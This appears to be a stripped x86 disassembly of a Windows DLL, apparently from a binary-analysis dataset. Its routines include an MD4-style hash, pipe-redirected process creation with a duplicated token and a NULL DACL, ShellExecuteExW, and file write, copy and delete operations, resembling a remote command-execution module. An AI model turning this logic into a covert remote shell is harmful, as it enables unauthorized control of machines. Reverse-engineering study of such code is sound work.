lea esi [ edx + esi + 0x6ed9eba1 ]
rol esi 0x9
mov edx esi
xor edx eax
xor edx ecx
add edx [ ebp - 0x30 ]
mov ebx esi
lea edi [ edx + edi + 0x6ed9eba1 ]
rol edi 0xb
xor ebx edi
mov edx ebx
xor edx ecx
add edx [ ebp - 0x10 ]
lea edx [ edx + eax + 0x6ed9eba1 ]
rol edx 0xf
xor ebx edx
add ebx [ ebp - 0x38 ]
mov eax edi
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor eax edx
xor eax ecx
add eax [ ebp - 0x18 ]
lea esi [ eax + esi + 0x6ed9eba1 ]
rol esi 0x9
mov eax esi
xor eax edx
xor eax ecx
add eax [ ebp - 0x28 ]
lea edi [ eax + edi + 0x6ed9eba1 ]
mov eax [ ebp - 0x4c ]
mov ebx [ eax ]
add ebx ecx
mov [ eax ] ebx
rol edi 0xb
mov ebx esi
xor ebx edi
xor ebx ecx
add ebx [ ebp - 0x8 ]
lea ecx [ ebx + edx + 0x6ed9eba1 ]
rol ecx 0xf
add ecx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
add ecx edi
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0xc ]
add ecx esi
mov [ eax + 0xc ] ecx
lea eax [ ebp - 0x44 ]
push eax
call [ memset@IAT ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
sub_100021ab
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
sub_100021ec
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_1000221c
lea eax [ esi + 0xc ]
mov [ esi ] r--data
push eax
mov [ esi + 0x8 ] r--data
call [ InitializeCriticalSection@IAT ]
xor eax eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
push 0x10
push eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
lea eax [ esi + 0x30 ]
push eax
call [ memset@IAT ]
add esp 0xc
mov eax esi
retn
sub_10002257
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002276
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10002294
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi ecx
call sub_10002972
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea edi [ ebp - 0x4 ]
lea eax [ esi + 0x8 ]
call sub_10002a5c
test al al
jne r-xdata
push [ ebp - 0x4 ]
call sub_10004ad0
pop ecx
pop edi
pop esi
leave
retn
sub_100022c3
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor ebx ebx
mov esi ecx
push edi
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x28 ] ebx
je r-xdata
cmp [ esi + 0x30 ] ebx
je r-xdata
lea eax [ esi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
lea eax [ esi + 0x8 ]
lea edi [ ebp - 0x4 ]
call sub_10002a5c
test al al
jne r-xdata
xor eax eax
mov eax [ esi + 0x44 ]
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x4 ]
xor edi edi
jmp r-xdata
push ebx
lea ecx [ ebp - 0x4 ]
push ecx
push ebx
push ebx
push ebx
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x50
mov eax [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ edi ]
lea eax [ esi + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call sub_10002972
mov edi 0x4e4
push edi
call sub_10004aa8
pop ecx
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
inc eax
push eax
call sub_10004aa8
mov edi eax
pop ecx
mov [ ebp - 0x8 ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax ] edi
mov [ eax + 0x4 ] 0x10
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x50
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ eax ]
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
push edi
push [ esi + 0x44 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
push ebx
push ebx
push [ ebp - 0x4 ]
push edi
mov edi [ MultiByteToWideChar@IAT ]
push ebx
push 0x1
call edi
mov ebx eax
lea eax [ ebx + ebx + 0x4e6 ]
push eax
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
call sub_10002972
mov edi 0x4e4
push edi
call sub_10004aa8
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor ebx ebx
push ebx
lea eax [ ebx + ebx + 0x4e6 ]
mov [ esi ] eax
mov [ esi + 0x4 ] 0xc
lea eax [ esi + 0x4e4 ]
push eax
mov [ esi + 0x8 ] ebx
and [ esi + 0xc ] 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push 0x0
push 0x1
call edi
push [ ebp - 0x8 ]
call sub_10004ad0
pop ecx
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ esi ] edi
mov [ esi + 0x4 ] 0x10
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x50
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ esi ]
jmp r-xdata
sub_10002487
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax 0x4
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esi + 0x10 ]
lea eax [ esi + 0x2dc ]
push eax
add esi 0xd4
push esi
mov esi edi
call sub_1000272e
mov esi 0x4e4
push esi
mov [ ebp - 0x4 ] eax
call sub_10004aa8
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp eax 0x8
je r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
mov [ ebx ] esi
mov [ ebx + 0x4 ] 0x4
mov [ ebx + 0x8 ] eax
mov eax [ edi + 0x38 ]
and [ ebp - 0xc ] 0x0
lea eax [ esi + 0x2dc ]
push eax
add esi 0xd4
lea ebx [ ebp - 0xc ]
call sub_10002681
mov esi 0x4e4
push esi
mov [ ebp - 0x4 ] eax
call sub_10004aa8
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp eax 0xc
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx ] esi
mov [ ebx + 0x4 ] 0x8
jmp r-xdata
xor ebx ebx
cmp [ edi + 0x30 ] ebx
je r-xdata
cmp eax 0x10
jne r-xdata
mov [ ebx + 0xc ] eax
lea eax [ edi + 0xc ]
push eax
mov [ ebp - 0xc ] eax
call [ EnterCriticalSection@IAT ]
push ebx
lea esi [ edi + 0x8 ]
call sub_100029e5
push [ ebp - 0xc ]
mov esi 0x4e4
push esi
call sub_10004aa8
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
cmp [ edi + 0x40 ] ebx
je r-xdata
mov esi edi
call sub_10002972
jmp r-xdata
lea ebx [ edi + 0xc ]
push ebx
mov [ eax ] esi
mov [ eax + 0x4 ] 0x10
mov [ eax + 0x8 ] 0x2
call [ EnterCriticalSection@IAT ]
push [ ebp - 0xc ]
lea esi [ edi + 0x8 ]
call sub_100029e5
push ebx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push [ esi + 0x8 ]
lea eax [ esi + 0x4e4 ]
push eax
push ebx
push 0x1
mov [ ebp - 0x4 ] eax
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0xc ] eax
inc eax
push eax
call sub_10004aa8
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
call [ LeaveCriticalSection@IAT ]
mov eax [ ebp - 0xc ]
push ebx
push ebx
inc eax
push eax
push [ ebp - 0x8 ]
push [ esi + 0x8 ]
push [ ebp - 0x4 ]
push ebx
push 0x1
call [ WideCharToMultiByte@IAT ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ edi + 0x40 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call sub_10004ad0
pop ecx
jmp r-xdata
mov esi edi
call sub_10002972
call [ GetLastError@IAT ]
mov esi 0x4e4
push esi
mov [ ebp - 0x4 ] eax
call sub_10004aa8
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
lea ebx [ edi + 0xc ]
push ebx
mov [ eax ] esi
mov [ eax + 0x4 ] 0x10
mov [ eax + 0x8 ] ecx
call [ EnterCriticalSection@IAT ]
push [ ebp - 0xc ]
lea esi [ edi + 0x8 ]
call sub_100029e5
push ebx
call [ LeaveCriticalSection@IAT ]
sub_10002681
push ebp
mov ebp esp
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
push 0x3c
lea eax [ ebp - 0x248 ]
push 0x0
push eax
call [ memset@IAT ]
and [ ebp - 0x22c ] 0x0
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x230 ] eax
add esp 0xc
lea eax [ ebp - 0x248 ]
push eax
mov [ ebp - 0x248 ] 0x3c
mov [ ebp - 0x244 ] 0x40
mov [ ebp - 0x238 ] esi
call [ ShellExecuteExW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x210 ]
call [ GetProcessId@IAT ]
push [ ebp - 0x210 ]
mov [ ebx ] eax
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn 0x4
sub_1000272e
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push 0x104
lea ecx [ ebp - 0x20c ]
mov [ ebp - 0x218 ] eax
mov eax [ ebp + 0xc ]
push ecx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
jne r-xdata
push ebx
xor ebx ebx
push edi
mov [ ebp - 0x214 ] ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wcscpy@IAT ]
pop ecx
pop ecx
call [ GetLastError@IAT ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] bx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn 0x14
lea eax [ ebp - 0x210 ]
push eax
push 0xb
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov edi [ CloseHandle@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x214 ] ebx
jne r-xdata
lea eax [ ebp - 0x214 ]
push eax
push 0x1
push 0x2
push ebx
push 0x2000000
push [ ebp - 0x210 ]
call [ DuplicateTokenEx@IAT ]
test eax eax
jne r-xdata
push 0x44
lea eax [ ebp - 0x280 ]
push ebx
push eax
call [ memset@IAT ]
push 0x10
lea eax [ esi + 0x30 ]
push ebx
push eax
call [ memset@IAT ]
xor eax eax
add esp 0x18
mov [ ebp - 0x280 ] 0x44
mov [ ebp - 0x250 ] ax
cmp [ ebp + 0x18 ] ebx
je r-xdata
push [ ebp - 0x210 ]
call edi
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x254 ] 0x1
push 0x1
lea eax [ ebp - 0x23c ]
push eax
call [ InitializeSecurityDescriptor@IAT ]
push ebx
push ebx
push 0x1
lea eax [ ebp - 0x23c ]
push eax
call [ SetSecurityDescriptorDacl@IAT ]
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x224 ] eax
push ebx
lea eax [ ebp - 0x228 ]
push eax
lea eax [ esi + 0x40 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
mov [ ebp - 0x228 ] 0xc
mov [ ebp - 0x220 ] 0x1
call [ CreatePipe@IAT ]
push ebx
lea eax [ ebp - 0x228 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ esi + 0x44 ]
push eax
call [ CreatePipe@IAT ]
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x248 ] eax
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] 0x101
jmp r-xdata
push [ ebp - 0x214 ]
call edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x214 ]
mov [ ebp - 0x218 ] eax
call edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
lea eax [ esi + 0x30 ]
push eax
lea eax [ ebp - 0x280 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push ebx
push ebx
push 0x1
push ebx
push ebx
push [ ebp - 0x218 ]
push ebx
push [ ebp - 0x214 ]
call [ CreateProcessAsUserW@IAT ]
test eax eax
jne r-xdata
xor eax eax
push [ ebp - 0x21c ]
call edi
push [ ebp - 0x210 ]
call edi
mov eax [ ebp - 0x218 ]
jmp r-xdata
push [ ebp - 0x21c ]
call edi
push [ ebp - 0x210 ]
call edi
push [ esi + 0x40 ]
call edi
push [ esi + 0x44 ]
call edi
mov [ esi + 0x44 ] ebx
mov [ esi + 0x40 ] ebx
sub_10002972
push ebx
lea ebx [ esi + 0x30 ]
mov eax [ ebx ]
test eax eax
je r-xdata
xor eax eax
push 0x10
push eax
push ebx
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
call [ memset@IAT ]
add esp 0xc
pop ebx
retn
push edi
push 0x0
push eax
call [ TerminateProcess@IAT ]
push [ ebx ]
mov edi [ CloseHandle@IAT ]
call edi
push [ esi + 0x34 ]
call edi
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call edi
pop edi
push eax
call edi
sub_100029c1
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ DeleteCriticalSection@IAT ]
mov esi [ esi + 0x1c ]
test esi esi
je r-xdata
pop esi
retn
push esi
call [ free@IAT ]
pop ecx
sub_100029e5
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x24 ]
push ebx
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax [ esi + 0x20 ]
ja r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ ecx + eax * 4 ] edx
inc [ esi + 0x20 ]
mov [ ebp - 0x1 ] 0x1
lea ebx [ eax * 4 + 0x190 ]
push ebx
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn 0x4
push ebx
push 0x0
push edi
call [ memset@IAT ]
mov eax [ esi + 0x24 ]
shl eax 0x2
push eax
push [ esi + 0x1c ]
push edi
call [ memcpy@IAT ]
mov eax [ esi + 0x1c ]
add esp 0x18
test eax eax
je r-xdata
add [ esi + 0x24 ] 0x64
mov [ esi + 0x1c ] edi
push eax
call [ free@IAT ]
pop ecx
sub_10002a5c
push esi
mov esi eax
mov ecx [ esi + 0x20 ]
xor al al
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
mov edx [ eax ]
dec ecx
mov [ esi + 0x20 ] ecx
shl ecx 0x2
push ecx
lea ecx [ eax + 0x4 ]
push ecx
push eax
mov [ edi ] edx
call [ memmove@IAT ]
add esp 0xc
call sub_10002aad
mov al 0x1
sub_10002a8e
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100029c1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10002aad
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov al 0x1
retn
mov ecx [ esi + 0x24 ]
sub ecx eax
cmp ecx 0x64
jb r-xdata
push ebx
lea ebx [ eax * 4 + 0x28 ]
push edi
push ebx
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop ebx
push ebx
push 0x0
push edi
call [ memset@IAT ]
mov eax [ esi + 0x20 ]
shl eax 0x2
push eax
push [ esi + 0x1c ]
push edi
call [ memcpy@IAT ]
mov eax [ esi + 0x1c ]
add esp 0x18
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
add eax 0xa
mov [ esi + 0x1c ] edi
mov [ esi + 0x24 ] eax
push eax
call [ free@IAT ]
pop ecx
sub_10002b26
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002b45
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10002b45
push esi
mov esi ecx
cmp [ esi + 0x20 ] 0x0
mov [ esi ] r--data
je r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi ] r--data
pop esi
retn
push edi
mov eax [ esi + 0x20 ]
mov edi [ eax + 0x8 ]
push eax
call sub_10004ad0
pop ecx
mov [ esi + 0x20 ] edi
test edi edi
jne r-xdata
pop edi
sub_10002b7c
push esi
lea esi [ ecx + 0x20 ]
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x2c
je r-xdata
pop esi
retn
lea esi [ eax + 0x8 ]
mov ecx [ eax + 0x8 ]
push eax
mov [ esi ] ecx
call sub_10004ad0
pop ecx
jmp r-xdata
sub_10002ba2
push ebp
mov ebp esp
push ecx
call sub_10002c8c
test eax eax
je r-xdata
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x80
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
xor eax eax
inc eax
sub_10002bcb
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x10 ]
mov ebx ecx
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
pop esi
inc eax
pop ebx
pop ebp
retn 0xc
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ memcpy@IAT ]
add esp 0xc
call sub_100047e4
sub_10002bff
push ebp
mov ebp esp
push esi
push 0x8b0
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
pop esi
pop ebp
retn 0xc
push 0x458
push 0x0
push esi
call [ memset@IAT ]
mov [ esi ] 0x8b0
mov [ esi + 0x4 ] 0x4
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x1c ] eax
mov eax [ ebp + 0xc ]
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
mov [ esi + 0x20 ] eax
je r-xdata
push 0x458
lea eax [ esi + 0x458 ]
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
mov eax esi
push 0x104
push [ ebp + 0x10 ]
lea eax [ esi + 0x24 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi + 0x22a ] ax
sub_10002c8c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1000fdc1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x528
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x520 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x538 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x2c ] eax
add eax 0x8
push eax
xor edi edi
xor esi esi
xor ebx ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esp + 0x2c ]
mov eax [ eax + 0x20 ]
cmp eax edi
je r-xdata
mov eax [ esp + 0x2c ]
add eax 0x8
push eax
call [ LeaveCriticalSection@IAT ]
cmp ebx edi
jne r-xdata
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp eax 0x28
jg r-xdata
xor eax eax
jmp r-xdata
cmp ebx eax
jne r-xdata
mov ebx [ ebx + 0x8 ]
cmp ebx edi
jne r-xdata
cmp eax 0x3c
jg r-xdata
je r-xdata
mov ecx [ esp + 0x538 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x520 ]
xor ecx esp
call sub_1000eff2
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
mov [ ecx + 0x20 ] eax
jmp r-xdata
cmp [ ebx + 0x4 ] 0x24
jne r-xdata
jmp r-xdata
cmp eax 0x40
je r-xdata
je r-xdata
and [ esp + 0x28 ] esi
and [ esp + 0x20 ] esi
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x34 ]
lea eax [ ebx + 0x18 ]
push eax
push eax
call sub_10003de7
mov eax [ esp + 0x20 ]
imul eax eax 0x230
mov edi 0x458
add eax edi
push eax
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
jne r-xdata
cmp eax 0x1c
jg r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov eax ecx
cmp eax edi
jne r-xdata
cmp ebx edi
jne r-xdata
mov eax [ esp + 0x2c ]
mov ebx [ eax + 0x20 ]
cmp eax 0x44
je r-xdata
mov esi [ memset@IAT ]
push 0x10
lea eax [ esp + 0x38 ]
push edi
push eax
call esi
add esp 0xc
push 0x44
lea eax [ esp + 0x68 ]
push edi
push eax
call esi
add esp 0xc
xor eax eax
mov [ esp + 0x94 ] ax
lea eax [ esp + 0x34 ]
push eax
lea eax [ esp + 0x68 ]
push eax
push edi
push edi
push edi
push edi
push edi
push edi
lea eax [ ebx + 0x18 ]
push eax
push edi
mov [ esp + 0x8c ] 0x44
mov [ esp + 0xb8 ] 0x1
call [ CreateProcessW@IAT ]
mov [ esp + 0x18 ] eax
cmp eax edi
je r-xdata
cmp eax 0x2c
je r-xdata
mov eax [ esp + 0x20 ]
imul eax eax 0x230
add eax edi
push eax
push 0x0
push esi
call [ memset@IAT ]
mov eax [ esp + 0x2c ]
imul eax eax 0x230
add eax edi
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x4 ]
add esp 0xc
cmp eax 0x28
je r-xdata
and [ esp + 0x20 ] eax
push edi
call sub_10004aa8
pop ecx
mov esi eax
sub eax 0x20
je r-xdata
je r-xdata
jmp r-xdata
cmp eax 0x48
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push [ esp + 0x38 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ esp + 0x34 ]
call esi
xor esi esi
jmp r-xdata
xor eax eax
cmp [ ebx + 0x42c ] edi
push edi
setne al
push 0x80
add eax 0x2
push eax
push edi
push edi
push __dos_header
lea eax [ ebx + 0x18 ]
push eax
call [ CreateFileW@IAT ]
mov [ esp + 0x10 ] eax
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x30
je r-xdata
mov edi [ wcsncpy@IAT ]
push 0x104
lea eax [ ebx + 0x18 ]
push eax
lea eax [ esi + 0x18 ]
push eax
call edi
add esp 0xc
push 0x104
lea eax [ ebx + 0x220 ]
push eax
lea eax [ esi + 0x220 ]
push eax
call edi
mov eax [ ebx + 0x428 ]
mov [ esi + 0x428 ] eax
mov eax [ esp + 0x2c ]
mov [ esi + 0x42c ] eax
cmp eax 0x40
je r-xdata
push 0x1e
lea eax [ esp + 0x38 ]
push edi
push eax
call [ memset@IAT ]
mov eax 0x614
mov [ esp + 0x50 ] ax
lea eax [ ebx + 0x18 ]
mov [ esp + 0x44 ] 0x3
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] edi
jmp r-xdata
dec eax
je r-xdata
push 0x1e
lea eax [ esp + 0x38 ]
push edi
push eax
call [ memset@IAT ]
mov [ esp + 0x44 ] 0x4
cmp eax 0xc
je r-xdata
cmp [ ebx + 0x4 ] 0x24
je r-xdata
and [ esp + 0x10 ] esi
and [ esp + 0x20 ] esi
mov esi [ wcsrchr@IAT ]
lea edi [ ebx + 0x18 ]
push 0x5c
push edi
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esp + 0x10 ] edi
jmp r-xdata
jmp r-xdata
mov eax [ ebx + 0x42c ]
push edi
push edi
xor ecx ecx
push ecx
push eax
push [ esp + 0x20 ]
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
call sub_10004d09
push eax
push esi
push edi
mov [ esp + 0x24 ] eax
call sub_10002bff
mov esi eax
cmp [ esp + 0x18 ] edi
je r-xdata
push 0x1e
lea eax [ esp + 0x38 ]
push edi
push eax
call [ memset@IAT ]
mov [ esp + 0x44 ] 0x2
jmp r-xdata
cmp eax 0x34
je r-xdata
cmp [ esp + 0x28 ] 0x0
je r-xdata
imul eax eax 0x230
push eax
push [ esp + 0x2c ]
lea eax [ esi + 0x458 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
mov eax [ esp + 0x20 ]
mov [ esi + 0x220 ] eax
push 0x104
lea eax [ ebx + 0x18 ]
push eax
lea eax [ esi + 0x18 ]
push eax
call [ wcsncpy@IAT ]
jmp r-xdata
cmp eax 0x44
jne r-xdata
add esp 0xc
lea eax [ esp + 0x34 ]
push eax
mov [ esp + 0x38 ] edi
call [ SHFileOperationW@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push edi
lea eax [ ebx + 0x18 ]
push eax
call [ CreateDirectoryW@IAT ]
mov [ esp + 0x18 ] eax
cmp eax edi
je r-xdata
sub eax 0x3
jne r-xdata
mov [ esp + 0x10 ] edi
call sub_10004d09
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ ebx + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x10
je r-xdata
mov eax esi
push ebx
call sub_10004ad0
pop ecx
call sub_10005306
push 0x2
mov [ esp + 0x300 ] eax
pop esi
mov edi 0x100
lea eax [ esp + 0x324 ]
push edi
push eax
call [ wcscpy@IAT ]
lea eax [ esp + 0x32c ]
push 0x5c
push eax
call esi
xor ecx ecx
add esp 0x10
mov [ eax ] cx
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x5c
push edi
call esi
pop ecx
pop ecx
mov ecx [ esp + 0x34 ]
add eax 0x2
push eax
lea eax [ esp + 0x330 ]
push eax
call sub_1000446a
jmp r-xdata
push [ esp + 0x10 ]
push esi
push [ esp + 0x20 ]
jmp r-xdata
mov eax esi
call sub_10004d09
mov [ esp + 0x10 ] eax
push edi
lea eax [ esp + 0x300 ]
push eax
push [ ebx + 0x430 ]
lea eax [ ebx + 0x458 ]
push eax
push [ esp + 0x20 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
call sub_10004d09
push eax
push esi
push edi
mov [ esp + 0x24 ] eax
call sub_10002bff
mov esi eax
cmp [ esp + 0x18 ] edi
je r-xdata
push [ esp + 0x18 ]
jmp r-xdata
mov eax 0x614
mov [ esp + 0x50 ] ax
lea eax [ ebx + 0x18 ]
mov [ esp + 0x48 ] eax
lea eax [ ebx + 0x220 ]
mov [ esp + 0x4c ] eax
push 0x1e
lea eax [ esp + 0x38 ]
push edi
push eax
call [ memset@IAT ]
mov [ esp + 0x44 ] 0x1
jmp r-xdata
cmp eax 0x38
jne r-xdata
push [ esp + 0x28 ]
add esp 0xc
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
xor esi esi
jmp r-xdata
xor esi esi
push esi
push 0xa7
push 0x3
push esi
push 0x1
lea eax [ ebx + 0x18 ]
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov [ esp + 0x20 ] eax
cmp eax 0xffffffff
jne r-xdata
push [ esp + 0x10 ]
jmp r-xdata
push [ esp + 0x10 ]
xor eax eax
cmp esi edi
sete al
push esi
push eax
mov edi [ ebx + 0x1c ]
push eax
mov eax [ esp + 0x30 ]
call sub_1000486f
jmp r-xdata
mov eax [ esp + 0x2c ]
push 0x24
pop edi
call sub_100048f8
mov eax [ esp + 0x2c ]
push 0x28
pop edi
